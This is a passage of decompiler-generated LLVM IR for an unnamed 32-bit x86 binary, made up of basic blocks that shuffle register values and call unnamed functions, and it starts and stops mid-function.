  %v6_804fc0f = and i32 %v1_804fc0a, -256
  %v7_804fc0f = or i32 %v4_804fc0f, %v6_804fc0f
  %v1_804fc18 = add i32 %v7_804fc0f, 1
  store i32 %v1_804fc18, i32* %eax.global-to-local, align 4
  %v1_804fc19 = add i32 %v0_804fc0f, 4
  %v2_804fc19 = inttoptr i32 %v1_804fc19 to i32*
  store i32 -1, i32* %v2_804fc19, align 4
  %v0_804fc20 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fc20 = trunc i32 %v0_804fc20 to i8
  %v2_804fc20 = load i32, i32* @edi, align 4
  %v3_804fc20 = add i32 %v2_804fc20, 284
  %v4_804fc20 = inttoptr i32 %v3_804fc20 to i8*
  store i8 %v1_804fc20, i8* %v4_804fc20, align 1
  %v0_804fc26 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fc26 = trunc i32 %v0_804fc26 to i8
  %tmp771 = icmp ult i8 %v1_804fc26, 10
  %v0_805007c = load i32, i32* @edi, align 4
  br i1 %tmp771, label %dec_label_pc_805007c, label %dec_label_pc_804fc2e

dec_label_pc_804fc2e:                             ; preds = %dec_label_pc_804fc03
  %v1_804fc2e = add i32 %v0_805007c, 284
  %v2_804fc2e = inttoptr i32 %v1_804fc2e to i8*
  store i8 0, i8* %v2_804fc2e, align 1
  %v0_804fc35 = load i32, i32* @edi, align 4
  %v1_804fc35 = add i32 %v0_804fc35, 12
  %v2_804fc35 = inttoptr i32 %v1_804fc35 to i32*
  store i32 0, i32* %v2_804fc35, align 4
  br label %dec_label_pc_804f47b

dec_label_pc_804fc41:                             ; preds = %dec_label_pc_804f575
  %v0_804fc41 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804fc41, i32* %edx.global-to-local, align 4
  %v1_804fc43 = load i32, i32* @esp, align 4
  %v2_804fc43 = add i32 %v1_804fc43, -4
  %v3_804fc43 = inttoptr i32 %v2_804fc43 to i32*
  store i32 %v0_804fc41, i32* %v3_804fc43, align 4
  %v0_804fc44 = load i32, i32* @edi, align 4
  %v1_804fc44 = add i32 %v0_804fc44, 92
  store i32 %v1_804fc44, i32* %eax.global-to-local, align 4
  %v1_804fc47 = add i32 %v1_804fc43, -8
  %v2_804fc47 = inttoptr i32 %v1_804fc47 to i32*
  store i32 192, i32* %v2_804fc47, align 4
  %v0_804fc4c = load i32, i32* %eax.global-to-local, align 4
  %v2_804fc4c = add i32 %v1_804fc43, -12
  %v3_804fc4c = inttoptr i32 %v2_804fc4c to i32*
  store i32 %v0_804fc4c, i32* %v3_804fc4c, align 4
  %v0_804fc4d = load i32, i32* %edx.global-to-local, align 4
  %v2_804fc4d = add i32 %v1_804fc43, -16
  %v3_804fc4d = inttoptr i32 %v2_804fc4d to i32*
  store i32 %v0_804fc4d, i32* %v3_804fc4d, align 4
  %v4_804fc4e = call i32 @function_8051a45(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804fc4e, i32* %eax.global-to-local, align 4
  %v0_804fc53 = load i32, i32* @edi, align 4
  %v1_804fc53 = add i32 %v0_804fc53, 24
  %v2_804fc53 = inttoptr i32 %v1_804fc53 to i32*
  %v3_804fc53 = load i32, i32* %v2_804fc53, align 4
  %v1_804fc56 = add i32 %v3_804fc53, -64
  store i32 %v1_804fc56, i32* %eax.global-to-local, align 4
  store i32 %v1_804fc56, i32* %v2_804fc53, align 4
  br label %dec_label_pc_804f589

dec_label_pc_804fc64:                             ; preds = %dec_label_pc_804f631
  store i8 -3, i8* %v1_804f631, align 1
  %v5_804f643.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f643

dec_label_pc_804fc6c:                             ; preds = %dec_label_pc_804f64e
  %v1_804fc6c = add i32 %v0_804fc6c, 2
  %v2_804fc6c = inttoptr i32 %v1_804fc6c to i8*
  store i8 -3, i8* %v2_804fc6c, align 1
  br label %dec_label_pc_804f656

dec_label_pc_804fc75:                             ; preds = %dec_label_pc_804f9a7, %dec_label_pc_804f9a7, %dec_label_pc_804f9a7, %dec_label_pc_804f9a7, %dec_label_pc_804f9a7
  %v1_804fc75 = add i32 %v0_804fc75, 1
  store i32 %v1_804fc75, i32* %eax.global-to-local, align 4
  %v1_804fc76 = load i32, i32* @esp, align 4
  %v2_804fc76 = add i32 %v1_804fc76, 36
  %v3_804fc76 = inttoptr i32 %v2_804fc76 to i32*
  store i32 %v1_804fc75, i32* %v3_804fc76, align 4
  %v0_804fc7a = load i32, i32* %eax.global-to-local, align 4
  %v1_804fc7a = add i32 %v0_804fc7a, 1
  %v8_804fc7a = icmp eq i32 %v1_804fc7a, 0
  store i32 %v1_804fc7a, i32* %eax.global-to-local, align 4
  br i1 %v8_804fc7a, label %dec_label_pc_804f56a.backedge, label %dec_label_pc_804fc81

dec_label_pc_804fc81:                             ; preds = %dec_label_pc_804fc75
  %v0_804fc81 = load i32, i32* @esp, align 4
  %v1_804fc81 = add i32 %v0_804fc81, 36
  %v2_804fc81 = inttoptr i32 %v1_804fc81 to i32*
  %v3_804fc81 = load i32, i32* %v2_804fc81, align 4
  store i32 %v3_804fc81, i32* %eax.global-to-local, align 4
  %tmp157 = icmp slt i32 %v3_804fc81, 1
  br i1 %tmp157, label %dec_label_pc_804fb29, label %dec_label_pc_804fc8d

dec_label_pc_804fc8d:                             ; preds = %dec_label_pc_804fc81
  %v1_804fc90 = add i32 %v0_804fc81, -16
  %v2_804fc90 = inttoptr i32 %v1_804fc90 to i32*
  store i32 8, i32* %v2_804fc90, align 4
  %v0_804fc92 = call i32 @function_80509f0()
  store i32 %v0_804fc92, i32* %eax.global-to-local, align 4
  %v0_804fc97 = load i32, i32* @esp, align 4
  %v1_804fc97 = inttoptr i32 %v0_804fc97 to i32*
  %v3_804fc97 = add i32 %v0_804fc97, 4
  %v1_804fc98 = inttoptr i32 %v3_804fc97 to i32*
  %v2_804fc98 = load i32, i32* %v1_804fc98, align 4
  store i32 %v2_804fc98, i32* %eax.global-to-local, align 4
  %v1_804fc99 = add i32 %v0_804fc97, 1944
  store i32 %v1_804fc99, i32* %ecx.global-to-local, align 4
  store i32 %v1_804fc99, i32* %v1_804fc98, align 4
  store i32 8, i32* %v1_804fc97, align 4
  %v0_804fca3 = call i32 @function_8050940()
  store i32 %v0_804fca3, i32* %eax.global-to-local, align 4
  %v0_804fca8 = load i32, i32* @esp, align 4
  %v1_804fca8 = add i32 %v0_804fca8, -4
  %v2_804fca8 = inttoptr i32 %v1_804fca8 to i32*
  store i32 16384, i32* %v2_804fca8, align 4
  %v1_804fcad = add i32 %v0_804fca8, 1944
  %v2_804fcad = inttoptr i32 %v1_804fcad to i32*
  %v3_804fcad = load i32, i32* %v2_804fcad, align 4
  store i32 %v3_804fcad, i32* @esi, align 4
  %v2_804fcb4 = add i32 %v0_804fca8, -8
  %v3_804fcb4 = inttoptr i32 %v2_804fcb4 to i32*
  store i32 %v3_804fcad, i32* %v3_804fcb4, align 4
  %v2_804fcb5 = add i32 %v0_804fca8, -12
  %v3_804fcb5 = inttoptr i32 %v2_804fcb5 to i32*
  store i32 %v0_804fca3, i32* %v3_804fcb5, align 4
  %v0_804fcb6 = load i32, i32* @edi, align 4
  %v1_804fcb6 = add i32 %v0_804fcb6, 4
  %v2_804fcb6 = inttoptr i32 %v1_804fcb6 to i32*
  %v3_804fcb6 = load i32, i32* %v2_804fcb6, align 4
  store i32 %v3_804fcb6, i32* @ebx, align 4
  %v2_804fcb9 = add i32 %v0_804fca8, -16
  %v3_804fcb9 = inttoptr i32 %v2_804fcb9 to i32*
  store i32 %v3_804fcb6, i32* %v3_804fcb9, align 4
  %v0_804fcba = call i32 @function_8051c16()
  store i32 %v0_804fcba, i32* %eax.global-to-local, align 4
  %v0_804fcbf = load i32, i32* @esp, align 4
  %v1_804fcc2 = add i32 %v0_804fcbf, 28
  %v2_804fcc2 = inttoptr i32 %v1_804fcc2 to i32*
  store i32 16384, i32* %v2_804fcc2, align 4
  %v1_804fcc7 = add i32 %v0_804fcbf, 24
  %v2_804fcc7 = inttoptr i32 %v1_804fcc7 to i32*
  store i32 2, i32* %v2_804fcc7, align 4
  %v1_804fcc9 = add i32 %v0_804fcbf, 20
  %v2_804fcc9 = inttoptr i32 %v1_804fcc9 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8053e82.25 to i32), i32* %v2_804fcc9, align 4
  %v0_804fcce = load i32, i32* @edi, align 4
  %v1_804fcce = add i32 %v0_804fcce, 4
  %v2_804fcce = inttoptr i32 %v1_804fcce to i32*
  %v3_804fcce = load i32, i32* %v2_804fcce, align 4
  store i32 %v3_804fcce, i32* %ecx.global-to-local, align 4
  %v2_804fcd1 = add i32 %v0_804fcbf, 16
  %v3_804fcd1 = inttoptr i32 %v2_804fcd1 to i32*
  store i32 %v3_804fcce, i32* %v3_804fcd1, align 4
  %v0_804fcd2 = call i32 @function_8051c16()
  store i32 %v0_804fcd2, i32* %eax.global-to-local, align 4
  %v0_804fcd7 = load i32, i32* @esp, align 4
  %v1_804fcd7 = inttoptr i32 %v0_804fcd7 to i32*
  store i32 8, i32* %v1_804fcd7, align 4
  %v0_804fcde = call i32 @function_8050970()
  store i32 %v0_804fcde, i32* %eax.global-to-local, align 4
  %v0_804fce6 = load i32, i32* @edi, align 4
  %v1_804fce6 = add i32 %v0_804fce6, 12
  %v2_804fce6 = inttoptr i32 %v1_804fce6 to i32*
  store i32 10, i32* %v2_804fce6, align 4
  br label %dec_label_pc_804faab

dec_label_pc_804fcf2:                             ; preds = %dec_label_pc_804f9ec, %dec_label_pc_804f9ec, %dec_label_pc_804f9ec, %dec_label_pc_804f9ec, %dec_label_pc_804f9ec
  %v1_804fcf2 = add i32 %v0_804fcf2, 1
  store i32 %v1_804fcf2, i32* %eax.global-to-local, align 4
  %v1_804fcf3 = load i32, i32* @esp, align 4
  %v2_804fcf3 = add i32 %v1_804fcf3, 36
  %v3_804fcf3 = inttoptr i32 %v2_804fcf3 to i32*
  store i32 %v1_804fcf2, i32* %v3_804fcf3, align 4
  %v0_804fcf7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fcf7 = add i32 %v0_804fcf7, 1
  %v8_804fcf7 = icmp eq i32 %v1_804fcf7, 0
  store i32 %v1_804fcf7, i32* %eax.global-to-local, align 4
  br i1 %v8_804fcf7, label %dec_label_pc_804f56a.backedge, label %dec_label_pc_804fcfe

dec_label_pc_804fcfe:                             ; preds = %dec_label_pc_804fcf2
  %v0_804fcfe = load i32, i32* @esp, align 4
  %v1_804fcfe = add i32 %v0_804fcfe, 36
  %v2_804fcfe = inttoptr i32 %v1_804fcfe to i32*
  %v3_804fcfe = load i32, i32* %v2_804fcfe, align 4
  store i32 %v3_804fcfe, i32* @esi, align 4
  %tmp158 = icmp slt i32 %v3_804fcfe, 1
  br i1 %tmp158, label %dec_label_pc_804fb29, label %dec_label_pc_804fd0a

dec_label_pc_804fd0a:                             ; preds = %dec_label_pc_804fcfe
  %v1_804fd0d = add i32 %v0_804fcfe, -16
  %v2_804fd0d = inttoptr i32 %v1_804fd0d to i32*
  store i32 7, i32* %v2_804fd0d, align 4
  %v0_804fd0f = call i32 @function_80509f0()
  store i32 %v0_804fd0f, i32* %eax.global-to-local, align 4
  %v0_804fd14 = load i32, i32* @esp, align 4
  %v1_804fd14 = inttoptr i32 %v0_804fd14 to i32*
  %v2_804fd14 = load i32, i32* %v1_804fd14, align 4
  store i32 %v2_804fd14, i32* %ecx.global-to-local, align 4
  %v3_804fd14 = add i32 %v0_804fd14, 4
  %v1_804fd15 = inttoptr i32 %v3_804fd14 to i32*
  %v2_804fd15 = load i32, i32* %v1_804fd15, align 4
  store i32 %v2_804fd15, i32* @ebx, align 4
  %v1_804fd16 = add i32 %v0_804fd14, 1944
  store i32 %v1_804fd16, i32* %edx.global-to-local, align 4
  store i32 %v1_804fd16, i32* %v1_804fd15, align 4
  store i32 7, i32* %v1_804fd14, align 4
  %v0_804fd20 = call i32 @function_8050940()
  store i32 %v0_804fd20, i32* %eax.global-to-local, align 4
  %v0_804fd25 = load i32, i32* @esp, align 4
  %v1_804fd25 = add i32 %v0_804fd25, -4
  %v2_804fd25 = inttoptr i32 %v1_804fd25 to i32*
  store i32 16384, i32* %v2_804fd25, align 4
  %v1_804fd2a = add i32 %v0_804fd25, 1944
  %v2_804fd2a = inttoptr i32 %v1_804fd2a to i32*
  %v3_804fd2a = load i32, i32* %v2_804fd2a, align 4
  store i32 %v3_804fd2a, i32* %edx.global-to-local, align 4
  %v2_804fd31 = add i32 %v0_804fd25, -8
  %v3_804fd31 = inttoptr i32 %v2_804fd31 to i32*
  store i32 %v3_804fd2a, i32* %v3_804fd31, align 4
  %v2_804fd32 = add i32 %v0_804fd25, -12
  %v3_804fd32 = inttoptr i32 %v2_804fd32 to i32*
  store i32 %v0_804fd20, i32* %v3_804fd32, align 4
  %v0_804fd33 = load i32, i32* @edi, align 4
  %v1_804fd33 = add i32 %v0_804fd33, 4
  %v2_804fd33 = inttoptr i32 %v1_804fd33 to i32*
  %v3_804fd33 = load i32, i32* %v2_804fd33, align 4
  store i32 %v3_804fd33, i32* %eax.global-to-local, align 4
  %v2_804fd36 = add i32 %v0_804fd25, -16
  %v3_804fd36 = inttoptr i32 %v2_804fd36 to i32*
  store i32 %v3_804fd33, i32* %v3_804fd36, align 4
  %v0_804fd37 = call i32 @function_8051c16()
  store i32 %v0_804fd37, i32* %eax.global-to-local, align 4
  %v0_804fd3c = load i32, i32* @esp, align 4
  %v1_804fd3f = add i32 %v0_804fd3c, 28
  %v2_804fd3f = inttoptr i32 %v1_804fd3f to i32*
  store i32 16384, i32* %v2_804fd3f, align 4
  %v1_804fd44 = add i32 %v0_804fd3c, 24
  %v2_804fd44 = inttoptr i32 %v1_804fd44 to i32*
  store i32 2, i32* %v2_804fd44, align 4
  %v1_804fd46 = add i32 %v0_804fd3c, 20
  %v2_804fd46 = inttoptr i32 %v1_804fd46 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8053e82.25 to i32), i32* %v2_804fd46, align 4
  %v0_804fd4b = load i32, i32* @edi, align 4
  %v1_804fd4b = add i32 %v0_804fd4b, 4
  %v2_804fd4b = inttoptr i32 %v1_804fd4b to i32*
  %v3_804fd4b = load i32, i32* %v2_804fd4b, align 4
  store i32 %v3_804fd4b, i32* %eax.global-to-local, align 4
  %v2_804fd4e = add i32 %v0_804fd3c, 16
  %v3_804fd4e = inttoptr i32 %v2_804fd4e to i32*
  store i32 %v3_804fd4b, i32* %v3_804fd4e, align 4
  %v0_804fd4f = call i32 @function_8051c16()
  store i32 %v0_804fd4f, i32* %eax.global-to-local, align 4
  %v0_804fd54 = load i32, i32* @esp, align 4
  %v1_804fd54 = inttoptr i32 %v0_804fd54 to i32*
  store i32 7, i32* %v1_804fd54, align 4
  %v0_804fd5b = call i32 @function_8050970()
  store i32 %v0_804fd5b, i32* %eax.global-to-local, align 4
  %v0_804fd63 = load i32, i32* @edi, align 4
  %v1_804fd63 = add i32 %v0_804fd63, 12
  %v2_804fd63 = inttoptr i32 %v1_804fd63 to i32*
  store i32 9, i32* %v2_804fd63, align 4
  br label %dec_label_pc_804faab

dec_label_pc_804fd6f:                             ; preds = %dec_label_pc_804f7ec, %dec_label_pc_804f7ec, %dec_label_pc_804f7ec, %dec_label_pc_804f7ec, %dec_label_pc_804f7ec
  %v1_804fd6f = add i32 %v0_804fd6f, 1
  store i32 %v1_804fd6f, i32* %eax.global-to-local, align 4
  %v1_804fd70 = load i32, i32* @esp, align 4
  %v2_804fd70 = add i32 %v1_804fd70, 36
  %v3_804fd70 = inttoptr i32 %v2_804fd70 to i32*
  store i32 %v1_804fd6f, i32* %v3_804fd70, align 4
  %v0_804fd74 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fd74 = add i32 %v0_804fd74, 1
  %v8_804fd74 = icmp eq i32 %v1_804fd74, 0
  store i32 %v1_804fd74, i32* %eax.global-to-local, align 4
  br i1 %v8_804fd74, label %dec_label_pc_804f56a.backedge, label %dec_label_pc_804fd7b

dec_label_pc_804fd7b:                             ; preds = %dec_label_pc_804fd6f
  %v0_804fd7b = load i32, i32* @esp, align 4
  %v1_804fd7b = add i32 %v0_804fd7b, 36
  %v2_804fd7b = inttoptr i32 %v1_804fd7b to i32*
  %v3_804fd7b = load i32, i32* %v2_804fd7b, align 4
  store i32 %v3_804fd7b, i32* @esi, align 4
  %tmp159 = icmp slt i32 %v3_804fd7b, 1
  br i1 %tmp159, label %dec_label_pc_804fb29, label %dec_label_pc_804fd87

dec_label_pc_804fd87:                             ; preds = %dec_label_pc_804fd7b
  %v1_804fd8a = add i32 %v0_804fd7b, -16
  %v2_804fd8a = inttoptr i32 %v1_804fd8a to i32*
  store i32 5, i32* %v2_804fd8a, align 4
  %v0_804fd8c = call i32 @function_80509f0()
  store i32 %v0_804fd8c, i32* %eax.global-to-local, align 4
  %v0_804fd91 = load i32, i32* @esp, align 4
  %v1_804fd91 = inttoptr i32 %v0_804fd91 to i32*
  %v2_804fd91 = load i32, i32* %v1_804fd91, align 4
  store i32 %v2_804fd91, i32* %ecx.global-to-local, align 4
  %v3_804fd91 = add i32 %v0_804fd91, 4
  %v1_804fd92 = inttoptr i32 %v3_804fd91 to i32*
  %v2_804fd92 = load i32, i32* %v1_804fd92, align 4
  store i32 %v2_804fd92, i32* @ebx, align 4
  %v1_804fd93 = add i32 %v0_804fd91, 1944
  store i32 %v1_804fd93, i32* %edx.global-to-local, align 4
  store i32 %v1_804fd93, i32* %v1_804fd92, align 4
  store i32 5, i32* %v1_804fd91, align 4
  %v0_804fd9d = call i32 @function_8050940()
  store i32 %v0_804fd9d, i32* %eax.global-to-local, align 4
  %v0_804fda2 = load i32, i32* @esp, align 4
  %v1_804fda2 = add i32 %v0_804fda2, -4
  %v2_804fda2 = inttoptr i32 %v1_804fda2 to i32*
  store i32 16384, i32* %v2_804fda2, align 4
  %v1_804fda7 = add i32 %v0_804fda2, 1944
  %v2_804fda7 = inttoptr i32 %v1_804fda7 to i32*
  %v3_804fda7 = load i32, i32* %v2_804fda7, align 4
  store i32 %v3_804fda7, i32* %edx.global-to-local, align 4
  %v2_804fdae = add i32 %v0_804fda2, -8
  %v3_804fdae = inttoptr i32 %v2_804fdae to i32*
  store i32 %v3_804fda7, i32* %v3_804fdae, align 4
  %v2_804fdaf = add i32 %v0_804fda2, -12
  %v3_804fdaf = inttoptr i32 %v2_804fdaf to i32*
  store i32 %v0_804fd9d, i32* %v3_804fdaf, align 4
  %v0_804fdb0 = load i32, i32* @edi, align 4
  %v1_804fdb0 = add i32 %v0_804fdb0, 4
  %v2_804fdb0 = inttoptr i32 %v1_804fdb0 to i32*
  %v3_804fdb0 = load i32, i32* %v2_804fdb0, align 4
  store i32 %v3_804fdb0, i32* %eax.global-to-local, align 4
  %v2_804fdb3 = add i32 %v0_804fda2, -16
  %v3_804fdb3 = inttoptr i32 %v2_804fdb3 to i32*
  store i32 %v3_804fdb0, i32* %v3_804fdb3, align 4
  %v0_804fdb4 = call i32 @function_8051c16()
  store i32 %v0_804fdb4, i32* %eax.global-to-local, align 4
  %v0_804fdb9 = load i32, i32* @esp, align 4
  %v1_804fdbc = add i32 %v0_804fdb9, 28
  %v2_804fdbc = inttoptr i32 %v1_804fdbc to i32*
  store i32 16384, i32* %v2_804fdbc, align 4
  %v1_804fdc1 = add i32 %v0_804fdb9, 24
  %v2_804fdc1 = inttoptr i32 %v1_804fdc1 to i32*
  store i32 2, i32* %v2_804fdc1, align 4
  %v1_804fdc3 = add i32 %v0_804fdb9, 20
  %v2_804fdc3 = inttoptr i32 %v1_804fdc3 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8053e82.25 to i32), i32* %v2_804fdc3, align 4
  %v0_804fdc8 = load i32, i32* @edi, align 4
  %v1_804fdc8 = add i32 %v0_804fdc8, 4
  %v2_804fdc8 = inttoptr i32 %v1_804fdc8 to i32*
  %v3_804fdc8 = load i32, i32* %v2_804fdc8, align 4
  %v2_804fdcb = add i32 %v0_804fdb9, 16
  %v3_804fdcb = inttoptr i32 %v2_804fdcb to i32*
  store i32 %v3_804fdc8, i32* %v3_804fdcb, align 4
  %v0_804fdcc = call i32 @function_8051c16()
  store i32 %v0_804fdcc, i32* %eax.global-to-local, align 4
  %v0_804fdd1 = load i32, i32* @esp, align 4
  %v1_804fdd1 = inttoptr i32 %v0_804fdd1 to i32*
  store i32 5, i32* %v1_804fdd1, align 4
  %v0_804fdd8 = call i32 @function_8050970()
  store i32 %v0_804fdd8, i32* %eax.global-to-local, align 4
  %v0_804fde0 = load i32, i32* @edi, align 4
  %v1_804fde0 = add i32 %v0_804fde0, 12
  %v2_804fde0 = inttoptr i32 %v1_804fde0 to i32*
  store i32 6, i32* %v2_804fde0, align 4
  br label %dec_label_pc_804faab

dec_label_pc_804fdec:                             ; preds = %dec_label_pc_804fae6, %dec_label_pc_804fae6, %dec_label_pc_804fae6, %dec_label_pc_804fae6
  %v1_804fdec = add i32 %v0_804fdec, 1
  store i32 %v1_804fdec, i32* %eax.global-to-local, align 4
  %v1_804fded = load i32, i32* @esp, align 4
  %v2_804fded = add i32 %v1_804fded, 36
  %v3_804fded = inttoptr i32 %v2_804fded to i32*
  store i32 %v1_804fdec, i32* %v3_804fded, align 4
  %v0_804fdf1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fdf1 = add i32 %v0_804fdf1, 1
  %v8_804fdf1 = icmp eq i32 %v1_804fdf1, 0
  store i32 %v1_804fdf1, i32* %eax.global-to-local, align 4
  %v1_804fdf2 = icmp eq i1 %v8_804fdf1, false
  br i1 %v1_804fdf2, label %dec_label_pc_804fea5, label %dec_label_pc_804fdf8

dec_label_pc_804fdf8:                             ; preds = %dec_label_pc_804fb0e, %dec_label_pc_804fdec, %dec_label_pc_804fada
  %v0_804fdf8 = load i32, i32* @esp, align 4
  %v1_804fdfb = add i32 %v0_804fdf8, -16
  %v2_804fdfb = inttoptr i32 %v1_804fdfb to i32*
  store i32 25, i32* %v2_804fdfb, align 4
  %v0_804fdfd = call i32 @function_80509f0()
  store i32 %v0_804fdfd, i32* %eax.global-to-local, align 4
  %v0_804fe02 = load i32, i32* @esp, align 4
  %v1_804fe02 = inttoptr i32 %v0_804fe02 to i32*
  %v2_804fe02 = load i32, i32* %v1_804fe02, align 4
  store i32 %v2_804fe02, i32* %eax.global-to-local, align 4
  %v3_804fe02 = add i32 %v0_804fe02, 4
  %v1_804fe03 = inttoptr i32 %v3_804fe02 to i32*
  %v2_804fe03 = load i32, i32* %v1_804fe03, align 4
  store i32 %v2_804fe03, i32* %edx.global-to-local, align 4
  %v1_804fe04 = add i32 %v0_804fe02, 1944
  store i32 %v1_804fe04, i32* %eax.global-to-local, align 4
  store i32 %v1_804fe04, i32* %v1_804fe03, align 4
  store i32 25, i32* %v1_804fe02, align 4
  %v0_804fe0e = call i32 @function_8050940()
  store i32 %v0_804fe0e, i32* %eax.global-to-local, align 4
  %v0_804fe13 = load i32, i32* @esp, align 4
  %v1_804fe13 = add i32 %v0_804fe13, 1944
  %v2_804fe13 = inttoptr i32 %v1_804fe13 to i32*
  %v3_804fe13 = load i32, i32* %v2_804fe13, align 4
  %v1_804fe1a = add i32 %v3_804fe13, -1
  store i32 %v1_804fe1a, i32* %edx.global-to-local, align 4
  %v2_804fe1b = add i32 %v0_804fe13, -4
  %v3_804fe1b = inttoptr i32 %v2_804fe1b to i32*
  store i32 %v1_804fe1a, i32* %v3_804fe1b, align 4
  %v2_804fe1c = add i32 %v0_804fe13, -8
  %v3_804fe1c = inttoptr i32 %v2_804fe1c to i32*
  store i32 %v0_804fe0e, i32* %v3_804fe1c, align 4
  %v0_804fe1d = load i32, i32* @edi, align 4
  %v1_804fe1d = add i32 %v0_804fe1d, 24
  %v2_804fe1d = inttoptr i32 %v1_804fe1d to i32*
  %v3_804fe1d = load i32, i32* %v2_804fe1d, align 4
  store i32 %v3_804fe1d, i32* %eax.global-to-local, align 4
  %v2_804fe20 = add i32 %v0_804fe13, -12
  %v3_804fe20 = inttoptr i32 %v2_804fe20 to i32*
  store i32 %v3_804fe1d, i32* %v3_804fe20, align 4
  %v1_804fe21 = add i32 %v0_804fe13, 36
  %v2_804fe21 = inttoptr i32 %v1_804fe21 to i32*
  %v3_804fe21 = load i32, i32* %v2_804fe21, align 4
  store i32 %v3_804fe21, i32* %eax.global-to-local, align 4
  %v2_804fe25 = add i32 %v0_804fe13, -16
  %v3_804fe25 = inttoptr i32 %v2_804fe25 to i32*
  store i32 %v3_804fe21, i32* %v3_804fe25, align 4
  %v0_804fe26 = call i32 @function_8051070()
  %v0_804fe2b = load i32, i32* @esp, align 4
  %v8_804fe2e = icmp eq i32 %v0_804fe26, -1
  %v1_804fe2f = icmp eq i1 %v8_804fe2e, false
  %v2_804fe2f = zext i1 %v1_804fe2f to i32
  %v2_804fe32 = icmp eq i1 %v1_804fe2f, false
  store i32 %v2_804fe2f, i32* %eax.global-to-local, align 4
  %v2_804fe37 = add i32 %v0_804fe2b, 68
  %v3_804fe37 = inttoptr i32 %v2_804fe37 to i32*
  store i32 %v2_804fe2f, i32* %v3_804fe37, align 4
  %v0_804f55d = load i32, i32* @esp, align 4
  %v1_804f560 = add i32 %v0_804f55d, -16
  %v2_804f560 = inttoptr i32 %v1_804f560 to i32*
  store i32 25, i32* %v2_804f560, align 4
  %v0_804f562 = call i32 @function_8050970()
  store i32 %v0_804f562, i32* %eax.global-to-local, align 4
  %v0_804f567 = load i32, i32* @esp, align 4
  br i1 %v2_804fe32, label %dec_label_pc_804f56a.backedge, label %dec_label_pc_804fe43

dec_label_pc_804fe43:                             ; preds = %dec_label_pc_804fdf8
  %v1_804fe50 = add i32 %v0_804f567, 52
  %v2_804fe50 = inttoptr i32 %v1_804fe50 to i32*
  %v3_804fe50 = load i32, i32* %v2_804fe50, align 4
  %v13_804fe50 = icmp eq i32 %v3_804fe50, -1
  br i1 %v13_804fe50, label %dec_label_pc_804f56a.backedge, label %dec_label_pc_804fe5b

dec_label_pc_804fe5b:                             ; preds = %dec_label_pc_804fe43, %dec_label_pc_804fea5
  %v0_804fe6b.in = phi i32 [ %v0_804f567, %dec_label_pc_804fe43 ], [ %v0_804feaf, %dec_label_pc_804fea5 ]
  %v0_804fe6b = add i32 %v0_804fe6b.in, 16
  %v1_804fe5b = add i32 %v0_804fe6b.in, 52
  %v2_804fe5b = inttoptr i32 %v1_804fe5b to i32*
  %v3_804fe5b = load i32, i32* %v2_804fe5b, align 4
  store i32 %v3_804fe5b, i32* %eax.global-to-local, align 4
  %tmp160 = icmp slt i32 %v3_804fe5b, 1
  br i1 %tmp160, label %dec_label_pc_804fb29, label %dec_label_pc_804fe67

dec_label_pc_804fe67:                             ; preds = %dec_label_pc_804fe5b
  %v0_804fe67 = load i32, i32* @edi, align 4
  %v1_804fe67 = inttoptr i32 %v0_804fe67 to i32*
  %v2_804fe67 = load i32, i32* %v1_804fe67, align 4
  store i32 %v2_804fe67, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804fe6b = add i32 %v0_804fe6b.in, 12
  %v2_804fe6b = inttoptr i32 %v1_804fe6b to i32*
  store i32 16384, i32* %v2_804fe6b, align 4
  %v0_804fe70 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fe70 = add i32 %v0_804fe70, 13
  %v2_804fe70 = inttoptr i32 %v1_804fe70 to i8*
  %v3_804fe70 = load i8, i8* %v2_804fe70, align 1
  %v4_804fe70 = zext i8 %v3_804fe70 to i32
  %v5_804fe70 = load i32, i32* %eax.global-to-local, align 4
  %v6_804fe70 = and i32 %v5_804fe70, -256
  %v7_804fe70 = or i32 %v6_804fe70, %v4_804fe70
  store i32 %v7_804fe70, i32* %eax.global-to-local, align 4
  %v2_804fe73 = add i32 %v0_804fe6b.in, 8
  %v3_804fe73 = inttoptr i32 %v2_804fe73 to i32*
  store i32 %v7_804fe70, i32* %v3_804fe73, align 4
  %v0_804fe74 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fe74 = add i32 %v0_804fe74, 4
  %v2_804fe74 = inttoptr i32 %v1_804fe74 to i32*
  %v3_804fe74 = load i32, i32* %v2_804fe74, align 4
  store i32 %v3_804fe74, i32* %eax.global-to-local, align 4
  %v2_804fe77 = add i32 %v0_804fe6b.in, 4
  %v3_804fe77 = inttoptr i32 %v2_804fe77 to i32*
  store i32 %v3_804fe74, i32* %v3_804fe77, align 4
  %v0_804fe78 = load i32, i32* @edi, align 4
  %v1_804fe78 = add i32 %v0_804fe78, 4
  %v2_804fe78 = inttoptr i32 %v1_804fe78 to i32*
  %v3_804fe78 = load i32, i32* %v2_804fe78, align 4
  store i32 %v3_804fe78, i32* %eax.global-to-local, align 4
  %v3_804fe7b = inttoptr i32 %v0_804fe6b.in to i32*
  store i32 %v3_804fe78, i32* %v3_804fe7b, align 4
  %v0_804fe7c = call i32 @function_8051c16()
  store i32 %v0_804fe7c, i32* %eax.global-to-local, align 4
  %v0_804fe81 = load i32, i32* @esp, align 4
  %v1_804fe81 = add i32 %v0_804fe81, -4
  %v2_804fe81 = inttoptr i32 %v1_804fe81 to i32*
  store i32 16384, i32* %v2_804fe81, align 4
  %v1_804fe86 = add i32 %v0_804fe81, -8
  %v2_804fe86 = inttoptr i32 %v1_804fe86 to i32*
  store i32 2, i32* %v2_804fe86, align 4
  %v1_804fe88 = add i32 %v0_804fe81, -12
  %v2_804fe88 = inttoptr i32 %v1_804fe88 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8053e82.25 to i32), i32* %v2_804fe88, align 4
  %v0_804fe8d = load i32, i32* @edi, align 4
